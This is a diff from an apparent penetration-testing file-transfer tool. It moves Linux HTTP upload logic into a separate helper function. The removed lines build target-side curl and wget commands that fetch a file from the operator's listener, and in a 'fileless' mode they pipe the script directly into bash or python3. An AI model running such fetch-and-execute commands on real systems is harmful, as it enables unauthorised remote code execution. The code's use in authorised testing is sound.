@@ -166,40 +166,7 @@ def upload_to(args):
         ### LINUX HTTP METHOD ###
         #########################
         elif method == 'HTTP' or method == 'HTTP - Fileless':
-            proc, listenIP, listenPort = services.startHTTP()
-
-            entrymsg = '[+] Select linux target download method:'
-            choice = helpers.populateChoices(entrymsg, Download_Methods)
-
-            if choice == 'cURL':
-                if method == 'HTTP':
-                    cmd = '# DOWNLOAD ' + args.filename.upper() + ' ON TARGET\n'
-                    cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + args.filename + ' -o ' + args.filename
-                elif method == 'HTTP - Fileless':
-                    entrymsg = '[+] Select file type being uploaded:'
-                    choice = helpers.populateChoices(entrymsg, Fileless_Types)
-                    cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
-                    if choice == 'BASH script (.sh)':
-                        cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | bash'
-                    elif choice == 'Python script (.py)':
-                        cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | python3'
-            elif choice == 'wget':
-                if method == 'HTTP':
-                    cmd = '# DOWNLOAD ' + args.filename.upper() + ' ON TARGET\n'
-                    cmd += 'wget http://' + listenIP + ':' + listenPort + '/' + args.filename
-                elif method == 'HTTP - Fileless':
-                    entrymsg = '[+] Select file type being uploaded:'
-                    choice = helpers.populateChoices(entrymsg, Fileless_Types)
-                    cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
-                    if choice == 'BASH script (.sh)':
-                        cmd += 'wget -qO- http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | bash'
-                    elif choice == 'Python script (.py)':
-                        cmd += 'wget -qO- http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | python3'
-            else:
-                print('[!] Not yet implemented')
-
-            helpers.pasta(cmd)
-            services.stopHTTP(proc)
+            linuxdo.httpUploadTo(args.filename, method)
 
         ########################
         ### LINUX SCP METHOD ###
